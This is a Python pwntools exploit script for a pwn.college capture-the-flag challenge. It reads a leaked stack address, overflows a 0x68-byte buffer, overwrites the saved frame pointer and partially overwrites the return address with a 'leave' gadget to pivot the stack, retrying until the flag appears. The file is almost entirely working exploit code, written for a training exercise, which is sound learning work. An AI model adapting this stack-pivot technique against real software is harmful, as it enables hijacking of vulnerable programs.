#!/bin/python

from pwn import * 
import sys
import time

context.arch = 'amd64'
#context.log_level  = 'debug'

FUNC_NAME="challenge"
BUFFER_LEN=0x68

elf = None
rop = None
libc = None


def get_payload(args, proc: process):
    global elf, rop, libc
    
    elf = proc.elf 
    rop = ROP(elf)
    libc = elf.libc
    
#    import IPython; IPython.embed()

    proc.recvuntil(b"[LEAK] Your input buffer is located at: 0x")
    leak_addr = int(proc.recvline(drop=True)[:-1], 16)
    
    rop.raw(cyclic(BUFFER_LEN))
    rop.raw(leak_addr - 16)
    rop.raw(p16(rop.leave.address))

    print(rop.dump())

    return rop.chain()


def main():
    for i in range(32):
        proc = process(sys.argv[1])
        proc.send(get_payload(None, proc))

        time.sleep(0.5)
        try:
            proc.recvuntil(b'pwn.college')
            print(proc.recvline())
            break
        except:
            pass


if __name__ == '__main__':
    main()
